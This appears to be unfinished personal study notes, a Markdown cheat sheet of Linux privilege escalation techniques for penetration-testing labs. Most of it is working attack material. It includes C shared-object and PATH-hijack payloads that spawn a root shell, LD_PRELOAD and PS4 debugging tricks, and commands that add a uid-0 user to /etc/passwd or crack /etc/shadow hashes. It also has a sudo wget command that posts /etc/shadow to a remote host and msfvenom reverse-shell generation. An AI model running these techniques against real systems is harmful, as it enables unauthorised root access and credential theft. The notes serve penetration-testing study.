# Work in Progress

## Automated Enumeration Tools

The below tools can be used to automate the survey and prviliege escalation process.  Reference the source documentation for usage of each tool.  If you plan to use these, run as many as you can as each each one offers different outputs and recommendations that others do not:

#### Scripts:

* [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
* [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
    ```
    # print everything the script can gather and do not prompt for a password
    ./lse.sh -l 2 -i
    ```
* [Linenum](https://github.com/rebootuser/LinEnum)
    ```
    # export files to a directory and do thorough tests
    ./linenum.sh -t -e linenum
    ```
* [linuxprivchecker](https://github.com/linted/linuxprivchecker)
* [beroot](https://github.com/AlessandroZ/BeRoot)
* [unix-priv-checker](http://pentestmonkey.net/tools/audit/unix-privesc-check)

#### Exploit Suggesters:

* [linux-exploit-suggester (bash)](https://github.com/mzet-/linux-exploit-suggester)
* [linux-exploit-suggester2 (perl)](https://github.com/jondonas/linux-exploit-suggester-2)


<br/> 

## Transferring Files

Netcat
```
# set up a listenr to serve the file 
nc -nlvp 4444 < <FILE>

# connect to the listener and grab the file 
nc <IP_ADDRESS> 4444 > <FILE> 
```

FTP method

web server method

<br/> 

## Survey Commands 

### System Information (Hardware/Software)

Kernel Version:
```
uname -a
cat /proc/version
cat /etc/issue
```
CPU Architexture:
```
lscpu
```
List the programs that you can run as root:
```
sudo -l
sudo -s 
sudo -i
```

what services are running:
```
ps aux
ps aux | egrep ^root
```

### Users and Groups

View the current user's information:
```
whoami
id

# my prvilieges (what command can I run as sudo):
sudo -l

# enviornment variables 
env
```
list users and groups
```
cat /etc/passwd
cat /etc/groups
```
User passwords:
```
cat /etc/shadow
```

For each user, check their /home directory and look at the .bash_history

### Networking 

Network configuration: 
```
ip a 
ifconfig
```
Routing:
```
route
ip route
```
Neighbors:
```
# old
arp -a

# new
ip neigh
```
Display TCP/UDP connections:
```
# all
netstat

# listinging ports
netstat -plant
```

Conntections Explained (reference: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)

* Local address 0.0.0.0 means that the service is listening on all interfaces. This means that it can receive a connection from the network card and anyone can connect to it (should have shown up in the nmap scan)
* Local address 127.0.0.1 means that the service is only listening for connections from the PC itself, not from the internet or anywhere else (will not show up in a external nmap scan)
* A private IP address means that the service is only listening for connections from the local network. So someone in the local network can connect to it, but not someone from the internet (will not show up in a external nmap scan)

Port forwarding to your attacker station:
```
ssh -R <ATTACKER_PORT>:127.0.0.1:<SERVICE_PORT> <USERNAME>@<ATTACKER_IP>
```


### Cronjobs

List cron table files (cron tabs):
```
# user
/var/spool/cron
/var/spool/cron/crontabs/

# system-wide cron jobs 
/etc/crontab 
```

Check for any cronjobs that are run by root and are world writeable

### Password Hunting

Search the entire file system for the word *PASSWORD*:
```
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
```
Search the file system for files that contain *password*
```
locate password | more
```
Search the file system for ssh keys:
```
# public keys 
find / -name authorized_keys 2> /dev/null

# private keys 
find / -name id_rsa 2> /dev/null
```

If you have access to the private keys, change the mode then try to use it to ssh to the target machine as root:
```
chmod 600 id_rsa

ssh -i id_rsa root@<IP_ADDRESS>
```

*ssh2john*
*how to add ssh backdoor* 

Check if we can read the password file:
```
cat /etc/shadow
```




Priviliege Escalation Techniques


## path injectoin
if can write to a location in PATH variable

### shell escape sequences 

escaping a progrma n to spwan a shell if the program is run a root 

list of programs with shell escape sequences: https://gtfobins.github.io/

### Enviorment Variables 

LD_PRELOAD is an environment variable which can be set to
the path of a shared object (.so) file.
When set, the shared object will be loaded before any others.
By creating a custom shared object and creating an init()
function, we can execute code as soon as the object is loaded.
86

see if we can edit this:
```
TCM@debian:~/tools$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD
```

Compile preload.c to preload.so:
4. Run any allowed program using sudo, while setting the
LD_PRELOAD environment variable to the full path of the
preload.so file:
90
$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
$ sudo LD_PRELOAD=/tmp/preload.so apache2

The LD_LIBRARY_PATH environment variable contains a set of directories where
shared libraries are searched for first.
The ldd command can be used to print the shared libraries used by a program:
By creating a shared library with the same name as one used by a program, and
setting LD_LIBRARY_PATH to its parent directory, the program will load our
shared library instead.

Compile library_path.c into libcrypt.so.1:
4. Run apache2 using sudo, while setting the
LD_LIBRARY_PATH environment variable to the current
path (where we compiled library_path.c):
94
$ gcc -o libcrypt.so.1 -shared -fPIC library_path.c
$ sudo LD_LIBRARY_PATH=. apache2

### Kernel Exploits 

what is a kernel?? 

View kernel version
```
uname -a

```
Use the kernel version to find exploits
```
searchsploit linux kernel <VERSION_NUMBER> priv esc
```

Best to use linux-exploit-suggester-2 to get a more refined list:
```
perl linux-exploit-suggester-2.pl -k <VERSION_NUMBER>
```
Use the linus-exploit-suggester or manually search through exploit-db 
Pre-compiled kernel exploit repo: https://github.com/lucyoa/kernel-exploits

#### Common exploit 

Dirty Cow complie:
```
gcc -pthread cow.c -o cow
```

### Service Exploits 

Services are programs that run in the background.  Exploiting a service running as root provides command execution as root 

show all processes running as root
```
ps aux | grep "^root"
```
 Obtain the version of the identified programs:
 ```
 <PROGRAM> --version
 <PROGRAM> -v
 
 # debian
 dpkg -l | grep <PROGRAM>
 
 # rpm systems
 rpm -ga | grep <PROGRAM>
 ```

Use searchsploit to find exploits for these programs.

### Password Hunting

Chekc if there are any passwords in the history:
```
history
```

Common locations: history files 
```
cat .bash_history
cat .mysql_history
cat .nano_history
```

Config files:
```
.ovpncat 
```
ssh keys:
```
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```

payloadallthethings password hunting commands


#### Password Cracking 

See if we have read.write access

If you have access to the /etc/passwd and /etc/shadow, use `unshadow` to combine the two files into a format that can be cracked:
```
unshadow <PASSWD_FILE> <SHADOW_FILE> > <OUTPUT_FILE>
```
Recommend delete all the users that do not have hashes to speed up the cracking process 

crack using hashcat:
```
#SHA512
hashcat -m 1800 <UNSHADOW_FILE> <WORDLIST> -O --force
```

## SUID/SGID 

add standard commands for SUID and strace, strings, and ltrace

### Shared Object Injection (SUID/SGID)

When a prgram is execited, it will try to load the shared objects it requires,  using `strace` we can track the system callls and determine whether any share objects were not found.  If we can write to the location the program tries to open, we can create a shared object to spawn a root shell.

1. look for files with the SUID/SGID set
2. try to execute the shared object (so) file
3. use strccae to see what phappends when execuitng the file 

```
strace <SO_FILE>
```
Pipe strace through grep to find key words that can be used for exploitation, such as file not found:
```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```
determine if the so is owned by root, then if we have permissions to write to the directory where a .so file is missing, we can create a malicious .so written in C and place it there:
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));
void inject() {
     setuid(0);
     system("/bin/bash -p");
}

```
these contents will just spawn a shell when loaded.  Complet this into an so file:
```
gcc -shared -fPIC -o <OUTPUT_FILE>.so <INPUT_FILE>
```

Now the original file with the SUID bit set and you should get a root shell 

### PATH Enviornement Variable (PATH Injection) 

The PATH environment variable contains a list of directories where
the shell should try to find programs.
If a program tries to execute another program, but only specifies
the program name, rather than its full (absolute) path, the shell will
search the PATH directories until it is found.
Since a user has full control over their PATH variable, we can tell the
shell to first look for programs in a directory we can write to.

Look at executeables with SUID/SGID to determine if they do not have the absolute path or to see if they are vulnerable to something else:

Running strings against a file to see plaintext strings and see what it is tring to execute:
$ strings /path/to/file

Running strace against a command to see how it is executed:
$ strace -v -f -e execve <command> 2>&1 | grep exec

Running ltrace against a command:
$ ltrace <command>

if there is an executeable being used, is int the PATH, and we right to the path, perform path injection:
```
int main() {
    setuid(0);
    system("/bin/bash -p");
}
```
this will spawn a root shell Compile this to the same name of the vulnerable executeable
```
gcc -o <NAME> <INPUT_FILE>
```
Last append your current directory with the malicious executeable in it and the execute the executeable with the SUID bit set:
PATH=.:$PATH <PATH_TO_EXECUTEABLE>

### abusing shell features - bash functions

Bash lower than version 4.2-048 allow us to define bash functions with / in the name, which take precednece over any executeable in the PATH.  SO even if a SUID executeable is calling another executeable with an absolute path, we can create a bash function using the same name.

use strings, strace and ltrace like before 
create a function with the same name as the one called in the SUID eecuteable the n export the functino:
```
$ function /usr/sbin/service { /bin/bash -p; }
$ export –f /usr/sbin/service
```
now run the SUID executeabke to spwn a root shell

### abusing shell features - bash debugging mode

in bash version lower than 4.4, inherit the PS4 enviornement baribale when runnings root, usd to thdisplay prompt while bash degubbung mode is on

Run the SUID file with bash debugging enabled and the PS4
variable assigned to our payload:

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown
root /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2

Run the /tmp/rootbash file with the -p command
line option to get a root shell:
/tmp/rootbash -p

## weak file permissions 

World Readable - means it can read by anyone 
world writeable - anyone can write to the file 

if etc/shadow is readable we can add a user to it

make the massword with the correct hash:
```
mkpasswd -m sha-512 <PASSWORD>
```
now replace the root users password hash with the one that you made.  now you can su to root!

if etc/passwd is readable we can add a user to it

The /etc/passwd historically contained user password hashes.
For backwards compatibility, if the second field of a user row in /etc/passwd
contains a password hash, it takes precedent over the hash in /etc/shadow.
If we can write to /etc/passwd, we can easily enter a known password hash for
the root user, and then use the su command to switch to the root user.

generate a password hash to be placed in the etc/passwd:
```
openssl passwd "password"
```
now add the password hash to the second filed in the etc/passwd file in place if the X for the root user

OR 

remove the x in the second field for root user, this makes it think that there is no password for the root user then you can just su to root.

Alternatively, if we can only append to the file, we can create a new user but
assign them the root user ID (0). This works because Linux allows multiple entries
for the same user ID, as long as the usernames are different.

```
echo "<USERNAME>:L9yLGxncbOROc:0:0:root:/root:/bin/bash" >> /etc/passwd
```


the x in the secod row means to look in the /etc/shadow file
- can delete the x which linux may interpret as there being no password


### Cracking passwords 

if the /etc/shadow file is readable 


root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
- password hash has his between the first and second colon (only copy that to a txt file for cracking)
- $6$ = SHA512
- 

Crack the hash using john
```
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```


### SUIG/SGID

SUID files get executed with the privileges of the file owner.
SGID files get executed with the privileges of the file group.
If the file is owned by root, it gets executed with root
privileges,

Locate all files with SUID or SGID:
```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
can use shell esacpe on files suid/sgid set 


### NFS Root Squashing

Root Squashing is how NFS prevents an obvious privilege
escalation.
If the remote user is (or claims to be) root (uid=0), NFS will
instead “squash” the user and treat them as if they are the
“nobody” user, in the “nogroup” group.
While this behavior is default, it can be disabled!

no_root_squash is an NFS configuration option which
turns root squashing off.
When included in a writable share configuration, a
remote user who identifies as “root” can create files on
the NFS share as the local root user.

View the contents of the NFS share configuration file:
```
cat /etc/exports 

```

Look for directories with the *no_root_squash* option like the /tmp directory is configured here:
```
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

This means files can be written to this directory as the root user over NFS.  Now we would try to mount the /tmp share:
```
showmount -e <IP_ADDRESS>
```
If the ouput says the /tmp share is available to mount, Create a elf file to execute a bash shell and place it in the mounted share:
```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /<MOUNTED_SHARE>/shell.elf
```
Now chmod the file and set the SUID bit, this wa it will be placed in the /tmp as  the root user:
```
chmod +xs /tmp/nfs/shell.elf
```
On the target machine, confirm the target was created with the correct permissions and excute the file to get a root shell

<br/>

## Sudo

check current sudo permossions:
```
sudo -l
```
now check each binay that you have sudo for against GTFO bins.  commom ones:

#### intended functionality - https://touhidshaikh.com/blog/2018/04/11/abusing-sudo-linux-privilege-escalation/

Some things let you do wierd stuff as sudo like apache, whic reads the first line of a file the nerrors out:
```
sudo apache2 -f /etc/shadow

#output 
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNWmSJ821kvJnIyoODYtBh.SF9aR7ciQBRCcw5bgjX0:17298:0:99999:7:::'
```
wget abuse of sudo by posting a file to a webserver
```
sudo wget --post-file=/etc/shadow <IP_ADDRESS>:<PORT> 
```
now you should have the /etc/shadow on your webserver
reference - HTB Sunday 


#### env variables via sudo 

check with sudo -l 

LD_Preload allows us to execute our own library (preload) before any other ocmmand is executed 

## Reverse Shells 
```
msfvenom -p linux/x86/reverse_shell_tcp lhost= lport= -f elf -o rev_shell.elf
```

Native reverse shells:

reverse shell generator: https://github.com/mthbernardes/rsg 

## References 

Checklists:
* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
* https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
* https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html

Courses:
* Udemy Linux Privilege Escalation for OSCP and Beyond! course
* Udemy Linux Privilege Escalation for Begginers course
